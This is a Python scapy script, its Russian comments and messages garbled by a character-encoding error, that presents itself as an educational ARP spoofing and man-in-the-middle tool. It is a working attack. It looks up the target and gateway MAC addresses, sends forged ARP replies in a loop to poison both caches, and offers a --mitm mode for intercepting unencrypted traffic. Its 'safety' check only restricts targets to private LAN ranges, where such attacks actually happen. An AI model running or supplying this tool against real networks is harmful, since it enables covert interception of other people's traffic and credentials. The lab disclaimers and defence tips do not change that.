#!/usr/bin/env python3
"""
–û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π ARP Spoofing –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç
–í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω–æ–π —Å—Ä–µ–¥–µ!

–ê–≤—Ç–æ—Ä: –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –º–∞—Ç–µ—Ä–∏–∞–ª –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
–õ–∏—Ü–µ–Ω–∑–∏—è: –¢–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π
"""

import sys
import time
import argparse
from scapy.all import *

class ARPSpoofingTool:
    """
    –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ ARP spoofing –∞—Ç–∞–∫
    """
    
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = None
        self.gateway_mac = None
        self.spoofing = False
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
        if not self._is_safe_target(target_ip) or not self._is_safe_target(gateway_ip):
            print("‚ùå –û–®–ò–ë–ö–ê: ARP spoofing —Ä–∞–∑—Ä–µ—à–µ–Ω —Ç–æ–ª—å–∫–æ –¥–ª—è –ª–æ–∫–∞–ª—å–Ω—ã—Ö —Å–µ—Ç–µ–π!")
            sys.exit(1)
    
    def _is_safe_target(self, ip):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Ü–µ–ª–∏"""
        safe_prefixes = ['127.', '192.168.', '10.']
        
        if ip.startswith('172.'):
            try:
                second_octet = int(ip.split('.')[1])
                return 16 <= second_octet <= 31
            except:
                return False
        
        return any(ip.startswith(prefix) for prefix in safe_prefixes)
    
    def get_mac_address(self, ip):
        """
        –ü–æ–ª—É—á–µ–Ω–∏–µ MAC –∞–¥—Ä–µ—Å–∞ –ø–æ IP
        """
        try:
            # –°–æ–∑–¥–∞–µ–º ARP –∑–∞–ø—Ä–æ—Å
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –∏ –ø–æ–ª—É—á–∞–µ–º –æ—Ç–≤–µ—Ç
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            else:
                print(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å MAC –∞–¥—Ä–µ—Å –¥–ª—è {ip}")
                return None
                
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è MAC –∞–¥—Ä–µ—Å–∞: {e}")
            return None
    
    def arp_spoof(self, duration=60):
        """
        ARP Spoofing –∞—Ç–∞–∫–∞
        """
        print(f"üéØ ARP Spoofing –∞—Ç–∞–∫–∞ –Ω–∞ {self.target_ip}")
        print(f"üåê –®–ª—é–∑: {self.gateway_ip}")
        print(f"‚è±Ô∏è  –ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: {duration} —Å–µ–∫—É–Ω–¥")
        
        # –ü–æ–ª—É—á–∞–µ–º MAC –∞–¥—Ä–µ—Å–∞
        print("\nüîç –ü–æ–ª—É—á–∞–µ–º MAC –∞–¥—Ä–µ—Å–∞...")
        self.target_mac = self.get_mac_address(self.target_ip)
        self.gateway_mac = self.get_mac_address(self.gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            print("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å MAC –∞–¥—Ä–µ—Å–∞. –ê—Ç–∞–∫–∞ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞.")
            return
        
        print(f"‚úÖ MAC —Ü–µ–ª–∏ ({self.target_ip}): {self.target_mac}")
        print(f"‚úÖ MAC —à–ª—é–∑–∞ ({self.gateway_ip}): {self.gateway_mac}")
        
        self.spoofing = True
        start_time = time.time()
        packet_count = 0
        
        print(f"\nüöÄ –ù–∞—á–∏–Ω–∞–µ–º ARP spoofing...")
        
        try:
            while self.spoofing and (time.time() - start_time) < duration:
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ª–æ–∂–Ω—ã–µ ARP –æ—Ç–≤–µ—Ç—ã
                # –ì–æ–≤–æ—Ä–∏–º —Ü–µ–ª–∏, —á—Ç–æ —à–ª—é–∑ —ç—Ç–æ –º—ã
                target_packet = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip)
                
                # –ì–æ–≤–æ—Ä–∏–º —à–ª—é–∑—É, —á—Ç–æ —Ü–µ–ª—å —ç—Ç–æ –º—ã
                gateway_packet = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip)
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–∞–∫–µ—Ç—ã
                send(target_packet, verbose=0)
                send(gateway_packet, verbose=0)
                
                packet_count += 2
                
                if packet_count % 20 == 0:
                    print(f"üìä –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {packet_count} ARP –ø–∞–∫–µ—Ç–æ–≤...")
                
                time.sleep(2)  # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∂–¥—ã–µ 2 —Å–µ–∫—É–Ω–¥—ã
                
        except KeyboardInterrupt:
            print("\nüõë ARP spoofing –ø—Ä–µ—Ä–≤–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ ARP spoofing: {e}")
        finally:
            self.spoofing = False
            self.restore_arp_table()
            print(f"‚úÖ ARP spoofing –∑–∞–≤–µ—Ä—à–µ–Ω. –í—Å–µ–≥–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {packet_count} –ø–∞–∫–µ—Ç–æ–≤")
    
    def restore_arp_table(self):
        """
        –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ ARP —Ç–∞–±–ª–∏—Ü—ã
        """
        print("\nüîÑ –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º ARP —Ç–∞–±–ª–∏—Ü—É...")
        
        try:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ ARP –æ—Ç–≤–µ—Ç—ã
            target_packet = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
            gateway_packet = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–∞–∑ –¥–ª—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏
            for _ in range(5):
                send(target_packet, verbose=0)
                send(gateway_packet, verbose=0)
                time.sleep(1)
            
            print("‚úÖ ARP —Ç–∞–±–ª–∏—Ü–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞")
            
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è ARP —Ç–∞–±–ª–∏—Ü—ã: {e}")
    
    def mitm_attack(self, duration=60):
        """
        Man-in-the-Middle –∞—Ç–∞–∫–∞ —Å –ø–µ—Ä–µ—Ö–≤–∞—Ç–æ–º —Ç—Ä–∞—Ñ–∏–∫–∞
        """
        print(f"üéØ Man-in-the-Middle –∞—Ç–∞–∫–∞")
        print(f"üì° –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º —Ç—Ä–∞—Ñ–∏–∫ –º–µ–∂–¥—É {self.target_ip} –∏ {self.gateway_ip}")
        
        # –°–Ω–∞—á–∞–ª–∞ –≤—ã–ø–æ–ª–Ω—è–µ–º ARP spoofing
        self.arp_spoof(duration)
        
        print("\nüìä –ê–Ω–∞–ª–∏–∑ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω–æ–≥–æ —Ç—Ä–∞—Ñ–∏–∫–∞:")
        print("  ‚Ä¢ HTTP –∑–∞–ø—Ä–æ—Å—ã –∏ –æ—Ç–≤–µ—Ç—ã")
        print("  ‚Ä¢ DNS –∑–∞–ø—Ä–æ—Å—ã")
        print("  ‚Ä¢ FTP –¥–∞–Ω–Ω—ã–µ")
        print("  ‚Ä¢ Email —Ç—Ä–∞—Ñ–∏–∫")
        print("  ‚Ä¢ –î—Ä—É–≥–∏–µ –Ω–µ–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –ø—Ä–æ—Ç–æ–∫–æ–ª—ã")

def main():
    """
    –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è ARP spoofing –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
    """
    print("=" * 60)
    print("üéØ –û–ë–†–ê–ó–û–í–ê–¢–ï–õ–¨–ù–´–ô ARP SPOOFING –ò–ù–°–¢–†–£–ú–ï–ù–¢")
    print("=" * 60)
    print("‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏–∏!")
    print("‚ö†Ô∏è  –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø—Ä–æ—Ç–∏–≤ —á—É–∂–∏—Ö —Å–∏—Å—Ç–µ–º –ù–ï–ó–ê–ö–û–ù–ù–û!")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='–û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π ARP spoofing –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç')
    parser.add_argument('target', help='IP –∞–¥—Ä–µ—Å —Ü–µ–ª–∏')
    parser.add_argument('gateway', help='IP –∞–¥—Ä–µ—Å —à–ª—é–∑–∞')
    parser.add_argument('-d', '--duration', type=int, default=60, 
                       help='–ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∞—Ç–∞–∫–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö')
    parser.add_argument('--mitm', action='store_true', 
                       help='–í—ã–ø–æ–ª–Ω–∏—Ç—å Man-in-the-Middle –∞—Ç–∞–∫—É')
    
    args = parser.parse_args()
    
    # –°–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞
    arp_tool = ARPSpoofingTool(args.target, args.gateway)
    
    try:
        if args.mitm:
            arp_tool.mitm_attack(args.duration)
        else:
            arp_tool.arp_spoof(args.duration)
            
    except KeyboardInterrupt:
        print("\nüõë –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
        arp_tool.spoofing = False
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
    
    print("\nüìö –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:")
    print("‚Ä¢ ARP Spoofing - –ø–æ–¥–º–µ–Ω–∞ MAC –∞–¥—Ä–µ—Å–æ–≤ –≤ ARP —Ç–∞–±–ª–∏—Ü–µ")
    print("‚Ä¢ Man-in-the-Middle - –ø–µ—Ä–µ—Ö–≤–∞—Ç —Ç—Ä–∞—Ñ–∏–∫–∞ –º–µ–∂–¥—É –∂–µ—Ä—Ç–≤–æ–π –∏ —à–ª—é–∑–æ–º")
    print("‚Ä¢ –ê—Ç–∞–∫–∞ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞—Ç—å –Ω–µ–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ")
    print("\nüõ°Ô∏è  –ú–µ—Ç–æ–¥—ã –∑–∞—â–∏—Ç—ã:")
    print("‚Ä¢ –°—Ç–∞—Ç–∏—á–µ—Å–∫–∏–µ ARP –∑–∞–ø–∏—Å–∏")
    print("‚Ä¢ ARP –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏ –¥–µ—Ç–µ–∫—Ü–∏—è")
    print("‚Ä¢ –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ VPN –∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è")
    print("‚Ä¢ –°–µ–≥–º–µ–Ω—Ç–∞—Ü–∏—è —Å–µ—Ç–∏")

if __name__ == "__main__":
    main()
